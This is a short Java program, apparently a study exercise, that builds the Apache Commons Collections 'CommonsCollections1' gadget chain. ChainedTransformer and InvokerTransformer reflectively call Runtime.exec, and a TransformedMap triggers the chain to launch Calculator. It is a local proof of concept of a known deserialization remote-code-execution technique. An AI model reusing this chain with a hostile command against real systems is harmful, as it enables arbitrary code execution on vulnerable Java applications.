import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections1Test2 {
    public static void main(String[] args) {
        // 要执行的命令
        String cmd = "open -a /System/Applications/Calculator.app";

        //构建一个 transformers 的数组,在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };

        // 将 transformers 数组存入 ChaniedTransformer 这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建个 Map 准备拿来绑定 transformerChina
        Map innerMap = new HashMap();
        innerMap.put("kk", "vvv");

        // 创建个 transformerChina 并绑定 innerMap
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.putAll(innerMap);

        System.out.println("执行完毕");
    }
}